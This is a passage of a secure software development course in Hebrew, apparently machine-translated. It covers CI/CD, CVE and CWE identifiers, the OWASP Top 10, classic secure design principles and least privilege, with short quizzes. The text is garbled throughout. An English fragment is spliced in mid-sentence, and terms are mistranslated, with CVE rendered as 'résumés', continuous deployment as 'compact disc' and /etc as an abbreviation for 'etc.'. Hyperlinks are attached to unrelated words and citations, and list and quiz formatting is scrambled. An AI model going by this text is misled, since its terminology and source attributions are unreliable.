2.  ** מדוע ניסיון לעקוב אחר תהליכים אלה ברצף קפדני ("מפל מים") הוא מסוכן ביותר ברוב הנסיבות ובדרך כלל יש להימנע ממנו.**טעות נפוצה נוספת היא להטמיע רכיבי תוכנה באופן עצמאי ולעולם לא לשלב ולבדוק אותם יחד עד שהכל יושלם באופן עצמאי. זו בדרך כלל טעות, כי זה מוביל לבעיות חמורות לגרום לרכיבים לעבוד יחד.*בפועל, רוב פיתוח התוכנה מבצע תהליכים אלה במקביל, מקפיץ מידע בין התהליכים עם קבלת מידע חדש. ישנן דרכים רבות לשלב תהליכים, אשר תלויים בגורמים רבים כגון גודל הצוות וכמה אמין התוצאה צריכה להיות. ישנן גישות רבות ושונות, כולל גישות שונות של פיתוח זריז ושונה, מצטבר, אבולוציוני ומפל מים. לצורך קורס זה, אנו נתמקד בהיבטי אבטחה בכל פעם שתבחר ליישם תהליך כלשהו, ולא הרבה על פרטים אלה. אז אתה יכול ליישם את החומרים של הקורס הזה ללא קשר לגישה שבה אתה משתמש. עם זאת, בואו נסתכל על כמה שיטות עבודה ומונחים ספציפיים שיכולים להיות חשובים לאבטחה.*פרקטיקה מומלצת מאוד היא להשתמש באינטגרציה רציפה (CI), הנוהג של מיזוג עותקים עובדים של פיתוח לתוך קו ראשי משותף (למשל, פעם בכמה ימים דרך פעמים רבות ביום). מיזוג שגרתי זה מפחית את הסיכונים של רכיבים לא לעבוד יחד אם האינטגרציה התעכבה עד מאוחר יותר, וזה דבר טוב. עם זאת, CI מוצלח דורש דרך לקבוע אם הרכיבים אכן עובדים יחד. בעיה זו נפתרת על-ידי שימוש בצינור CI - תהליך שפועל בכל פעם שמשהו מתמזג כדי להבטיח שהוא בונה ועובר סדרה של בדיקות אוטומטיות ובדיקות אחרות.

3.  **ארגונים רבים רוצים לפרוס תוכנות/שירותים במהירות רבה יותר, ואימצו גישות שונות כדי לעשות זאת תוך התבססות על תהליכי פיתוח תוכנה סטנדרטיים אלה. ההגדרות משתנות, אך הנה כמה מונחים נפוצים:**אספקה רציפה (CD או CDE) נועדה להבטיח **"יישום נמצא תמיד במצב מוכן לייצור לאחר שעבר בהצלחה בדיקות אוטומטיות ובדיקות איכות \[על ידי שימוש בשיטות עבודה] כדי לספק תוכנה באופן אוטומטי לסביבה דמוית ייצור"** (מוג'תבא שאהין, מוחמד עלי באבר ולימינג ז'ו, **אינטגרציה, אספקה ופריסה מתמשכות: סקירה שיטתית של גישות, כלים, אתגרים ופרקטיקות**, 2017). שים לב שהתוכנה לא בהכרח משוחררת או נפרסת ללא שלב אישור נפרד.

4.  **פריסה רציפה (תקליטור) **"הולך צעד אחד קדימה \[מאשר אספקה רציפה] ופורס באופן אוטומטי ורציף את היישום בסביבות ייצור או לקוחות"

    1.  ** (מוג'תבא שאהין, מוחמד עלי באבר ולימינג ז'ו, **אינטגרציה, אספקה ופריסה מתמשכות: סקירה שיטתית של גישות, כלים, אתגרים ופרקטיקות

    2.  **, 2017).**DevOps מתמקדת בתיאום ושיתוף פעולה בין צוותי פיתוח התוכנה (Dev) ותפעול ה-IT (Ops) (מייק לוקיידס, *בחינה מחודשת של "מה זה DevOps"* gather some data (then you cannot lose its confidentiality later), or you might choose a programming language where certain kinds of vulnerabilities cannot happen (eliminating the risks from those kinds of vulnerabilities).

    3.  **)**העוקבים אחר הקבוצה הציבורית הנוכחית של ערכי CVE.,

    4.  **קורות חיים מוקצים על-ידי רשות מספור CVE (CNA). CNA הוא פשוט ארגון המורשה להקצות מזהי CVE לפגיעויות המשפיעות על מוצרים בטווח כלשהו שהוגדר מראש. ה- CNA הראשי (המכונה "CNA של המוצא האחרון") יכול להקצות CVE גם אם אף אחד אחר לא יכול (תפקיד זה מתמלא כעת על ידי **מיטרה

        1.  ). CNAs רבים הם מפתחי מוצרי תוכנה (כגון Microsoft ו- Red Hat) המקצים מספרי CVE עבור המוצרים שלהם. ישנם גם רכזי צד שלישי לפגיעויות, כגון 

        2.  מרכז התיאום של CERT

        3.  שהם CNAs., כל CNA מקבל בלוק של מספרים שלמים שהוא יכול להשתמש בהם ב- CVEs. משמעות הדבר היא כי CVE-2025-50000 לא אומר שזה פגיעות מספר 50,000 בשנת 2025, אלא רק כי CNA אשר הקצה את מזהה CVE היה מורשה להקצות 50,000 בשנת 2025.

        4.  פגיעויות רבות הידועות לציבור אינן כוללות הקצאות CVE. קודם כל, CVEs מוקצים רק אם מישהו מבקש הקצאה מ- CNA; אם לא תוגש בקשה, לא יהיה CVE. בנוסף, קורות חיים מוגבלים בכוונה בהיקפם. קורות חיים מוענקים רק עבור תוכנות שפורסמו לציבור (כולל קדם-מהדורות אם נעשה בהן שימוש נרחב). CVEs בדרך כלל אינם מוקצים לתוכנה שנבנתה בהתאמה אישית שאינה מופצת. הם גם לא מוקצים בדרך כלל לשירותים מקוונים. עם זאת, CVEs הם השיטה הנפוצה ביותר למתן מזהה ייחודי עבור כל פגיעות הידועה לציבור, ולכן חשוב לדעת עליהם.

5.  **סוגים מובילים של פגיעויות**ניתן לקבץ את הרוב המכריע של הפגיעויות לקטגוריות. זה מתברר להיות מאוד שימושי; ברגע שאנו מזהים קטגוריות, אנו יכולים לקבוע אילו מהן נפוצות ואילו צעדים אנו יכולים לנקוט כדי למנוע פגיעות מסוג זה להתרחש שוב.

ה *ספירת חולשות נפוצות (CWE)* היא רשימה ארוכה מאוד של חולשות נפוצות. בטרמינולוגיה שלהם, "חולשה" היא קטגוריה (סוג) של פגיעות. שים לב להבדל בין CVE ל- CWE: CWE מזהה *סוג* של פגיעות, בעוד ש- CVE מזהה *ספציפי* פגיעות במוצרים מסוימים (משפחה של). לכל CWE יש מזהה עם מספר, לדוגמה, CWE-20. נזכיר את CWE מעת לעת. עם זאת, ה-CWE הוא רשימה גדולה, ואנחנו לא יכולים לכסות את כל ה-CWEs בקורס הזה.

#### אנשים זיהו את הסוגים החשובים ביותר או המובילים ביותר של פגיעויות מבחינת הסבירות והחומרה שלהם. שתיים מהרשימות הפופולריות ביותר של סוגים מובילים של פגיעויות הן:

OWASP טופ 10*רשימה זו, שפותחה על-ידי פרוייקט אבטחת יישומי האינטרנט הפתוחים (OWASP), מייצגת *"הסכמה רחבה לגבי סיכוני האבטחה הקריטיים ביותר ליישומי אינטרנט."

 זה נקרא גם OWASP Top 10 סיכוני אבטחה של יישומי אינטרנט.[*רשימת 25 המובילים של CWE*](https://www.schneier.com/blog/archives/2008/03/the_security_mi\_1.html)זוהי רשימה של הסוגים הנפוצים והקריטיים ביותר של פגיעויות. הוא נוצר על ידי צוות ספירת החולשות הנפוצות (CWE) על ידי ניתוח נתונים על פגיעויות ידועות לציבור לאורך שנים רבות. רשימה זו יכולה להיות מיושמת על כל תוכנה, אך נפוץ במיוחד להחיל אותה על תוכנה שאינה יישום אינטרנט (שכן רשימת OWASP מתמקדת ביישומי אינטרנט). מוזרות מעניינת אחת: הם מזהים חולשות חשובות מעבר ל-25 הראשונות, כך שתוכלו לראות מספרים גדולים מ-25 המשויכים לרשימה זו.

> *ל- OWASP יש רשימות אחרות של 10 המובילות עבור סוגים שונים של תוכנות. לדוגמה:*

OWASP נייד טופ 10* - היישומים הניידים Top 10*פרויקט האינטרנט של הדברים OWASP

####  - האינטרנט של הדברים (IoT) טופ 10.

עם זאת, רשימת 10 המובילים של יישום האינטרנט היא רשימת 10 המובילים הידועה ביותר מ- OWASP.[*פגיעויות מובילות אלה אינן רק נפוצות, אלא הן נוטות לגרום לפגיעויות חמורות.*](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html)הרשימות המובילות האלה אכן משתנות עם הזמן. למרבה הצער, הם לא משתנים הרבה. רבות מהפגיעויות המובילות ב- CWE Top 25 היו אותם סוגים נפוצים של פגיעויות במשך עשרות שנים (לדוגמה, ראה 

> *מחקר תכנון טכנולוגיית אבטחת מחשבים*

, 

כרך א'

####  ו 

כרך ב'*מאת James P. Anderson, 1972), ורוב הבעיות המובילות ביישומי אינטרנט היו סוגים נפוצים של פגיעויות ביישומי אינטרנט מאז שנות ה-90., אז בזמן שדברים משתנים, לומדים על *סביבון

 סוגים של פגיעויות יעזרו לך במשך שנים רבות.*במקומות שונים לאורך הקורס תוכלו לראות את סמל 🔔 פעמון האזעקה . סמל זה מציין שהפגיעויות הנדונות הן כה נפוצות עד שהן נמצאות ברשימת 10 סיכוני האבטחה המובילים של יישומי אינטרנט של OWASP ו/או ברשימת 25 המובילים של CWE.*הערך של הכרת סוגים מובילים של פגיעויות

***אנו נשקיע זמן רב בקורס זה בסקירת סוגים נפוצים של פגיעויות. הסיכון לעשות זאת הוא שאתה עלול לחשוב שזה כל מה שיש בפיתוח תוכנה מאובטחת. זה לא נכון.***

הימנעות מטעויות נפוצות היא *לא* מספיק, כשלעצמו, כדי להפוך את התוכנה למאובטחת.

#### אבל תלוי איך אתה מודד דברים, בין 90% ל-99% או יותר פגיעויות מכוסות על ידי הרשימות המובילות האלה. על ידי מניעת טעויות נפוצות, תפחית את מספר הפגיעויות לפחות בסדר גודל! זה הופך את הידיעה - וההתמודדות - עם סוגים נפוצים של פגיעויות לבעלת ערך רב, מכיוון שהיא תהפוך את התוכנה שלך להרבה יותר מאובטחת. אומר 

לעולם אל תטעו

 אינה מעשית. לעומת זאת, זה מעשי להתמקד בזיהוי וניהול של סוגי הטעויות הנפוצים ביותר שמובילים לפגיעויות. חלק מהסיבה שפגיעויות אלה נפוצות היא שרוב המפתחים אינם יודעים מה הם; לדעת מה הם הוא הצעד הראשון לניהול אותם.

לזיהוי סוגים נפוצים של פגיעויות יש גם יתרון נוסף: זה יעזור לך לזהות 

משהו אחר \__\__\__\__\__

 סוגים של פגיעויות. כפי שכבר ציינו, אין תחליף לחשיבה. אבל מפתחים רבים מוצאים את זה מאתגר לראות את המערכות שלהם כמו תוקף. על ידי התבוננות בסוגים נפוצים של פגיעויות מהעבר, אתה יכול להיות רגיש יותר לפגיעויות באופן כללי. אז אמנם ידיעת סוגים נפוצים של פגיעויות לא 

להחליף

###  לחשוב, לדעת אותם יכול 

עזרה

####  אתה חושב.

חידון 1.8: פגיעויות

*   \>>בחר את המשפט האמיתי. <<*(!) לכל הפגיעויות הידועות לציבור מוקצים מזהי CVE. {{לא, מישהו צריך לבקש מזהה CVE. בנוסף, CVEs מוענקים רק עבור תוכנות שפורסמו לציבור (כולל קדם-מהדורות אם נעשה בהן שימוש נרחב). CVEs בדרך כלל אינם מוקצים לתוכנה שנבנתה בהתאמה אישית שאינה מופצת. הם גם אינם מוקצים בדרך כלל לשירותים מקוונים.}}*( ) כל קורות החיים מוקצים על ידי תאגיד MITRE. {{No, CVEs מוקצים על-ידי "רשות מספור CVE" (CNA.)}}

*   (x) הימנעות מסוגים נפוצים של פגיעויות אינה מספיקה בפני עצמה כדי להפוך את התוכנה למאובטחת, אך היא יכולה להיות עזרה משמעותית.*עיצוב*פרק זה מתאר כיצד לעצב תוכנה כך שתהיה מאובטחת, תוך התמקדות בעקרונות עיצוב מאובטחים מרכזיים כגון הרשאות מינימליות, גישור מלא ואימות קלט.

*   *מטרות הלמידה:*הסבר מהם עקרונות עיצוב מאובטח וספק דוגמאות לכמה עקרונות מרכזיים מקובלים.*דונו במושג הפריבילגיה הפחותה.*דונו בגישור מלא ("אי עקיפה"), כולל טעויות נפוצות.

*   *הבן את אימות הקלט בסביבה שניתן לסמוך עליה.*דונו בעקרונות עיצוב מאובטח מקובלים אחרים, במיוחד אלה שזוהו על ידי זלצר ושרודר.

*   *יסודות התכנון המאובטח*מהם עקרונות תכנון אבטחה?

*   *כאשר אתה כותב תוכנה לא טריוויאלית, אתה צריך לשבור את הבעיה לרכיבים קטנים יותר שעובדים יחד. תהליך זה של החלטה כיצד לשבור בעיה לרכיבים וכיצד הם יעבדו יחד נקרא *עיצוב

####  או 

תכנון אדריכלי

. לדוגמה, אתה מעצב כאשר אתה מנסה להחליט כיצד לחלק בעיה לקבוצה מסוימת של מחלקות ושיטות. התוצאה של החלטות אלה נקראת גם עיצוב או עיצוב אדריכלי. המילה "עיצוב" משמשת גם לתיאור עיצוב ממשק משתמש, אבל זה לא המובן שאנחנו מתכוונים אליו כאן.*זכור שתהליך העיצוב, כמו כל תהליך פיתוח תוכנה אחר, לא קורה רק פעם אחת. זה באמת נפוץ לנסות ליישם כמה תוכנה, להבין כי העיצוב לא עובד, ולאחר מכן לשנות את העיצוב. לעתים קרובות עליך לשנות עיצוב כאשר אתה משנה את מה שהתוכנה עושה. אז תהליך העיצוב קורה בכל פעם שאתה חושב על שינוי איך לפרק את הבעיה בתוכנה שלך.*עיצובים מסוימים טובים יותר מאחרים: חלקם קלים יותר לתחזוקה, מהירים יותר וכן הלאה. בפרט, עיצובים מסוימים מאובטחים יותר מעיצובים אחרים. אין טריק קסמים שמבטיח שהעיצוב שלכם מאובטח. אבל אנשים מפתחים תוכנה במשך עשרות שנים, ובאמצעות ניסיון, הם זיהו קבוצה של *עקרונות העיצוב* זה יכול לעזור לך לבחור עיצובים טובים על פני עיצובים רעים.[*עקרונות העיצוב הם מדריכים מדויקים המבוססים על ניסיון ופרקטיקה. במילים אחרות, עקרונות העיצוב הם כללי אצבע שיעזרו לכם להימנע במהירות מעיצוב גרוע וינחו אתכם לעיצוב טוב במקום זאת. עם זאת, עקרונות תכנון מאובטח אינם מבטיחים אבטחה; הם כלי עזר לחשיבה, לא תחליף לחשיבה. לדוגמה, לפעמים עיקרון לא יחול בכלל. לפעמים עקרונות מתנגשים; לדוגמה, עיקרון אחד של עיצוב מאובטח הוא שמירה על דברים פשוטים, אבל לפעמים אתה צריך יותר מורכבות כדי לבצע משהו אחר. במקרים נדירים יותר, יכולות להיות סיבות טובות מבחינה ביטחונית אפילו להפר לחלוטין עיקרון. עם זאת, התוכנה שלך תהיה בדרך כלל מאובטחת יותר אם תחשוב על עקרונות עיצוב מאובטחים ותנסה ליישם אותם. עקרונות עיצוב מאובטחים הם חוכמה מזוקקת, ואתה תהיה חכם לשקול אותם.*](https://dl.acm.org/doi/10.5555/41765.41801)כשאתה חושב על העיצוב שלך, אתה צריך לחשוב על אילו רכיבים אתה יכול לסמוך (וכמה), ועל אילו רכיבים אתה לא בהכרח יכול לסמוך. כמה עקרונות עיצוב מדברים על 

גבול אמון

. גבול האמון הוא פשוט הגבול בין הרכיבים שאתה סומך עליהם לבין הרכיבים שאתה לא בהכרח סומך עליהם. מיקום גבול האמון תלוי בתוכנה שאתה מפתח:

אם אתה כותב יישום בצד השרת, סביר להניח שאתה נותן אמון במה שאתה מפעיל (לדוגמה, המחשב, מערכת ההפעלה וזמן הריצה של הגורם המכיל, אם קיים), אך לא במערכות הלקוח החיצוניות (שחלקן עשויות להיות נשלטות על-ידי תוקף). גבול האמון הוא בין השרת ללקוחות.

אם אתה כותב אפליקציה סלולרית (סמארטפון) שמדברת לשרת שאתה שולט בו, סביר להניח שאתה סומך על אותו שרת מרוחק. אתה לא צריך לסמוך על נתיב התקשורת בין היישום הנייד שלך לשרת (אז תרצה להשתמש TLS כדי להצפין אותו). אתה בהחלט לא צריך לסמוך על יישומים אחרים על הטלפון החכם, אלא אם כן יש לך סיבה מיוחדת לסמוך על אחד. אז ברור שיש גבול בין היישום הנייד שלך לבין (1) האינטרנט הכללי ו-(2) יישומים ניידים אחרים. אמון הוא לעתים קרובות לא מוחלט; אתה כנראה סומך על כך שמערכת ההפעלה של הטלפון החכם הנייד תפעל עבור אותו משתמש, אך משתמש זה עשוי להיות תוקף, אז אתה כנראה צריך לוודא שסודות מסוימים לעולם לא ייכנסו ליישום הנייד בכלל.

*   חידון 2.1: מהם עקרונות תכנון אבטחה?*>>אם תפעל לפי עקרונות העיצוב המאובטח, תמיד תיצור תוכנה מאובטחת. אמת או שקר? <<*(!) נכון[*(x) לא נכון*](https://arxiv.org/abs/1703.07019)\[הסבר]

*   למרבה הצער, שמירה על עקרונות עיצוב מאובטח אינה מבטיחה תוכנה מאובטחת. במקום זאת, הם רק מדריך בעל ערך לדרך זו. אתה עדיין צריך *לחשוב*.[*\[הסבר\]*](https://arxiv.org/abs/1703.07019)עקרונות תכנון מאובטח מומלצים באופן נרחב

*   תוכנה נמצאת תחת מתקפה כבר עשרות שנים, ועקרונות עיצוב מאובטחים מרכזיים רבים זוהו בשנת 1975 על ידי ג'רום ה. זלצר ומיכאל ד. שרודר (S\&S) במאמרם, [*הגנה על מידע במערכות מחשוב*](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html). מה שיפה ברשימה שלהם הוא שהיא עמדה במבחן הזמן; עקרונות אלה חשובים לא פחות כיום. עקרונות אחרים זוהו מאז, אבל בואו נתחיל עם הרשימה שלהם.

*   ברשימה שלהם הם מתמקדים ב [*מערכת הגנה*](https://www.redhat.com/en/topics/devops/what-is-devsecops) - כלומר, החלק של המערכת כי האבטחה תלויה. הנה הרשימה שלהם, יחד עם כמה שמות חלופיים:

*   הפריבילגיה הפחותה ביותר[כל משתמש (אנושי) ותוכנית צריכים לפעול תוך שימוש בהרשאות המעטות ביותר האפשריות. עיקרון זה מגביל את הנזק כתוצאה מתאונה, טעות או התקפה. היא גם מפחיתה את מספר האינטראקציות הפוטנציאליות בין תוכניות מורשות, כך שסביר להניח ששימושים לא מכוונים, לא רצויים או לא ראויים בהרשאות יתרחשו פחות.](https://www.gitops.tech/)גישור מלא (המכונה אי עקיפה)[*יש לבדוק כל ניסיון גישה; מקם את המנגנון כך שלא ניתן יהיה לערער עליו. מילה נרדפת למטרה זו היא אי-עקיפה.*](https://www.redhat.com/en/topics/devops/what-is-gitops)כלכלת מנגנון (המכונה פשטות)[*המערכת, בפרט החלק שהאבטחה תלויה בו, צריכה להיות פשוטה וקטנה ככל האפשר.*](https://about.gitlab.com/topics/gitops/)עיצוב פתוח

אסור שמנגנון ההגנה יהיה תלוי בבורות של התוקפים. במקום זאת, עליך לפעול כאילו המנגנון ידוע לציבור, ובמקום זאת להסתמך על סודיות של פריטים מעטים יחסית הניתנים לשינוי בקלות כמו סיסמאות או מפתחות פרטיים. תוקף לא אמור להיות מסוגל לפרוץ למערכת רק בגלל שהתוקף יודע איך זה עובד. "אבטחה באמצעות אלמוניות" בדרך כלל לא עובד.

ברירות מחדל בטוחות לכשל*התקנת ברירת המחדל צריכה להיות ההתקנה המאובטחת. אם לא בטוח שצריך לאפשר משהו, אל תאפשר את זה.*הפרדת הרשאות (למשל, שימוש באימות דו-גורמי)

**הגישה לאובייקטים צריכה להיות תלויה ביותר מתנאי אחד (כגון סיסמה). בדרך זו, אם תוקף מצליח לשבור תנאי אחד (למשל, על ידי גניבת מפתח) המערכת נשארת מאובטחת. הערה: לפעמים תוכניות מחולקות לחלקים, כל חלק עם הרשאה אחרת. גישה זו נקראת לעתים באופן מבלבל "הפרדת פריבילגיות" - אך שבירת תוכנית לחלקים בעלי הרשאות שונות היא משהו אחר. בטרמינולוגיה זו, זוהי דוגמה לפריבילגיה מינימלית.**המנגנון הכי פחות נפוץ (כלומר למזער שיתוף)

צמצמו את הכמות והשימוש במנגנונים משותפים. הימנע משיתוף קבצים, ספריות, ביצוע ליבה של מערכת ההפעלה או מחשבים עם משהו שאינך בוטח בו, מכיוון שהתוקפים עלולים לנצל אותם.

#### קבלה פסיכולוגית (aka קל לשימוש)

הממשק האנושי חייב להיות מתוכנן כך שיהיה קל שימוש כך שהמשתמשים ישתמשו באופן שגרתי ואוטומטי במנגנוני ההגנה בצורה נכונה.

מאז, זוהו גם עקרונות עיצוב מאובטחים אחרים על ידי אנשים שונים; נסקור כמה כאלה במהלך הקורס.

זכרו, עקרונות העיצוב הם פשוט כללי אצבע. כאשר אתה מפרק את הבעיה שלך כדי לפתור אותה, עליך לחשוב על עקרונות אלה, מכיוון שהם יעזרו להנחות אותך ליצירת תוכנה מאובטחת יותר. ישנם מקרים בהם יהיו לך סיבות טובות 

לא

 החל אותם. עקרונות אלה אינם מחליפים את החשיבה - הם עוזרים *מדריך* אתה כשאתה חושב.

לאחר מכן, נבחן ביתר פירוט כמה מהעקרונות הללו, משום שיש להם השלכות שאולי אינן ברורות מאליהן. ביחידה הבאה נתחיל בהתבוננות 

#### הפריבילגיה הפחותה ביותר

.

חידון 2.2: עקרונות תכנון מאובטח מומלצים באופן נרחב

\>>אם נשמור בסוד את אופן הפעולה של המערכת, המערכת תהיה מאובטחת. אמת או שקר? <<

( ) נכון

(x) לא נכון

\[הסבר]

עקרון "העיצוב הפתוח" אומר שאנחנו לא יכולים לסמוך על התוקפים שלא יודעים איך מערכת עובדת. במקום זאת, עלינו לתכנן את המערכות שלנו כך שיישארו מאובטחות גם כאשר התוקף יודע בדיוק איך זה עובד.

\[הסבר]

### הפריבילגיה הפחותה ביותר

כבר ציינו כי הפריבילגיה הפחותה היא עיקרון חשוב של עיצוב מאובטח. הרעיון הבסיסי הוא שכל משתמש (אדם או תוכנית) צריך לפעול תוך שימוש בהרשאות המעטות ביותר האפשריות. באופן כללי, אל תאפשר קריאה או כתיבה של מידע אלא אם כן עליך לעשות זאת עבור משתמש זה.

ההרשאה הפחותה ביותר מגבילה את הנזק הפוטנציאלי כתוצאה מהתקיפה, וגם מפחיתה את המורכבות של אינטראקציות הקשורות לאבטחה. זה אפילו משתרע על החלקים הפנימיים של תוכנית: רק החלק הקטן ביותר של תוכנית שזקוק להרשאות צריך (באופן אידיאלי) לקבל אותן. כמובן, בשלב מסוים, זה הופך להיות מסובך מדי לעשות (ואנחנו גם רוצים לשמור על התוכנית פשוטה ככל האפשר).[דרכים ליישם את הפריבילגיה הפחותה ביותר](https://www.nist.gov/cyberframework)להלן מספר דרכים ליישם את הפריבילגיה הפחותה, בהתאם לנסיבות:

1.  **אל תעניק לתוכנית הרשאות מיוחדות (כאשר הדבר מעשי)**<br>*אם זה יכול להיעשות, לעשות את זה, כי זה הכי טוב מנקודת מבט ביטחונית. לדוגמה, לינוקס תומכת ביצירת תוכניות *

2.  **סתויד**<br>* או **סטגיד**כך שפשוט הפעלת התוכנית מעניקה לתוכנית את ההרשאות של בעליה., אם אתה יכול להימנע לחלוטין משימוש במנגנון זה, שקול לעשות את זה, כי זה נותן הרשאות מיוחדות לתוכניות. לעתים קרובות יש חלופות בטוחות יותר; לדוגמה, דרישה מאנשים להתחבר באופן ספציפי עם הרשאות (זוהי המטרה של *

3.  **סודו**<br>*).*

4.  **מזער את ההרשאות המיוחדות שתוכנית מקבלת, כולל מזעור הנתונים הנגישים לה**<br>בלינוקס, ייתכן שיש לך תוכנית מתחת (או להפעיל בשם) קבוצה מיוחדת או משתמש שיש להם רק זכויות ספציפיות, במקום משהו חסוי יותר (כמו שורש). אם אתה קורא לממשק שאילתה של מערכת מסד נתונים, הגבל את הזכויות של משתמש מסד הנתונים שבו משתמש היישום. אם מערכת מסד הנתונים שלך משתמשת ב- SQL, ייתכן שתוכל להשתמש בפקודה SQL GRANT כדי להגביל את ההרשאות שהתוכנית מקבלת. משתמשי Redis עשויים להשתמש בפקודת ACL של Redis כדי להגביל הרשאות.

5.  **וותר לצמיתות על הרשאות בהקדם האפשרי**<br>*לדוגמה, אם אתה משתמש במזהי קבוצות שמורים, מזהי משתמשים או יכולות של Linux, שחרר לצמיתות הרשאות נוספות אלה בהקדם האפשרי. בדרך זו, אם ההתקפה מתרחשת לאחר מכן, התוקף אינו יכול לנצל הרשאות אלה.*

אם אינך יכול לוותר לצמיתות על הרשאות, נסה למזער את הזמן שבו ההרשאה פעילה**זה פחות יעיל, מכיוון שהתקפות מסוימות יכולות לאלץ תוכניות להפעיל קוד שרירותי. אך התקפות מסוימות יכולות לגרום לתוכניות לבצע רק מספר מוגבל של פעולות, ומזעור הזמן שבו ההרשאה פעילה יפחית את מה שתוקף יכול לעשות.**לשבור את התוכנית למודולים שונים, ולתת הרשאות מיוחדות רק אחד או כמה מודולים (חלקים של התוכנית)**המודול המיוחס באופן אידיאלי אפילו לא ייתן אמון מלא בחלקים האחרים של התוכנית שלך (aka a **עיצוב חשוד הדדית**). אם תעשה זאת, אם חלק כלשהו מהתוכנית שלך יהיה חתרני, זה יגביל את מה שתוקף יכול לעשות באופן מיידי. לדוגמה, ייתכן שתפצל את החלק של תוכנית המיישם ממשק משתמש גרפי מחלק אחר בעל הרשאות. מנגנוני הפרדה כמו קונטיינרים, מכונות וירטואליות, seccomp לינוקס וסוגים שונים של עטיפות אבטחה יכולים לעזור לך להפריד חלקים של התוכנית שלך, כך שחתרנות של חלק אחד לא בהכרח לשבור אחר. **היזהרו:

 *הקפד להגדיר מנגנונים אלה כדי להפריד את המודולים באופן מאובטח, ולהגביל את ההרשאות בכל חלק.* מנגנוני הפרדה אלה לרוב אינם חסינים בפני תקלות, לכן אל תניח שהשימוש בהם הופך את התוכנית שלך למאובטחת באופן אוטומטי. עם זאת, הם יכולים להפוך את התוכנית שלך לקשה יותר לתקיפה ועשויים להפחית את הנזק אם התקפה מצליחה.

מזעור (הגבל) של משטח התקיפה*ה *משטח תקיפה

####  היא קבוצת הפעולות (לדוגמה, ה-API שלה ויציאות הרשת הפתוחות שלה) שתוקף פוטנציאלי יכול לגשת אליהן. לדוגמה, אם אתה מאפשר גישה ציבורית לשיטה כלשהי, אז אתה נותן לכל התוקפים גישה לשיטה זו - האם אתה בטוח שאתה צריך? במידת האפשר, הגבל את הפעולות שתוקף פוטנציאלי יכול לגשת אליהן. אם הציבור לא צריך גישה, אל תיתן לציבור גישה. בפרט, הימנע מהשארת פעולות איתור באגים במערכות ייצור שהתוקף יכול לגשת אליהן; פעולות איתור באגים הן מקור נפוץ לבעיות.

אמת (בדוק) קלט לפני קבלתו

אל תסתפקו בקבלת נתונים מתוקף פוטנציאלי; בדוק אותו ביסודיות לפני שתקבל אותו. נדון באימות קלט ביתר פירוט בהמשך. כמובן, עליך לוודא שהתוקפים אינם יכולים לעקוף אימות קלט זה; זה נושא כל כך גדול שיש לו עיקרון משלו, 

גישור מלא

aka, 

### אי-עקיפה

. אנחנו נדבר על זה בהמשך.

ארגז חול של התוכנית שלך*הפעל במכוון את התוכנית שלך (או חלק ממנה) בסביבה עם יכולות מוגבלות במכוון.*מזעור הרשאות עבור קבצים ומשאבים אחרים

#### לדוגמה, בדרך כלל אתה לא צריך קבצים לכתיבה על ידי כולם (אפילו קריא על ידי כולם הוא לעתים קרובות מפוקפק). באנדרואיד, קובץ הניתן לכתיבה על ידי כולם יכול להשתנות על ידי יישום אחר (אולי זדוני).

🔔 הרשאות שגויות הן סיבה נפוצה כל כך לפגיעויות אבטחה שזה 2021 CWE Top 25 #22 ו- 2019 CWE Top 25 #15. זה 

CWE-732* (*הקצאת הרשאה שגויה עבור משאב קריטי*). הרשאות שגויות גרועות במיוחד אם *ברירת מחדל* ההרשאות אינן מאובטחות; שהמקרה המיוחד הוא *CWE-276

 (

#### הרשאות ברירת מחדל שגויות

).*דוגמאות לפריבילגיה מינימלית*בואו נסתכל על כמה דוגמאות ספציפיות.*בעת פיתוח יישומים מבוססי אינטרנט, אל תאפשר למשתמשים לגשת (לקרוא) קבצים כגון השרת *כוללים* ו *תצורה* קבצים. נתונים אלה עשויים לספק בטעות מספיק מידע (למשל, סיסמאות) כדי לפרוץ למערכת. אם אתה משתמש בשרת אינטרנט מסורתי, שמור את כל מה שאינך צריך כדי לשרת ישירות למשתמשים מחוץ ל"שורש התיעוד " (*דוקרוט[); בדרך זו, התוקפים אינם יכולים אפילו לבקש את המידע בקלות. מניעת הגשה של קבצים שאתה יודע שאין להגיש ישירות (כגון ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)כוללים[ קבצים).](https://nvd.nist.gov/)[אל תאפשר למשתמשים לכתוב קבצי תצורת מערכת כברירת מחדל (לדוגמה, קבצי מערכת ב- ](https://nvd.nist.gov/)[/וכו](https://nvd.nist.gov/) בלינוקס וביוניקס), ובמידת האפשרות, שקול למנוע קריאות גם על ידי משתמשים רגילים. הבעיה היא שמנהלי מערכת מכניסים לעתים קרובות סיסמאות ומפתחות לקבצי תצורה. אם יש סיבות להעניק הרשאות קריאה רחבות יותר לחלק ממידע תצורת המערכת (לדוגמה, ב- 

/וכו[), שקול ליצור ספריית תצורת מערכת במקום קובץ תצורת מערכת שבו שם הספריה מסתיים באופן קונבנציונלי ב- ](https://www.mitre.org/)ד.[. ספריות תצורת מערכת הן לעתים קרובות טובות יותר בכל מקרה, מכיוון שהן הופכות את זה לטריוויאלי עבור מנהלי חבילות להוסיף ולהסיר קבצי תצורה ספציפיים. לצורך אבטחה, ספריות תצורת מערכת לא רק מפחיתות את הסיכון לשגיאות, אלא שלקבצים ספציפיים (כגון קבצים עם מפתחות סודיים וסיסמאות) יכולות להיות הרשאות מוגבלות יותר. אם אתה משתמש בספריית תצורת מערכת, זה פחות בעיה לאפשר למשתמש לקרוא, כי זה הרבה יותר קל להגן על המפתחות הסודיים וסיסמאות.](https://sei.cmu.edu/about/divisions/cert/index.cfm)אם אתה מיישם API חיצוני (לדוגמה, עם REST או GraphQL), אל תספק פעולת "כתיבה" אלא אם כן אתה מצפה שייעשה בו שימוש. אם אתה מאפשר כתיבה, נסה להגביל באופן מקסימלי 

מי

####  יכול לכתוב. לדוגמה, יש בעלים של נתונים ספציפיים ואפשר רק לבעלים לשנות נתונים אלה, במקום לאפשר לכל אחד לשנות דבר. אם הדבר מעשי, עצב את התוכנה שלך כך שהיא לא תוכל לכתוב נתונים 

אפילו

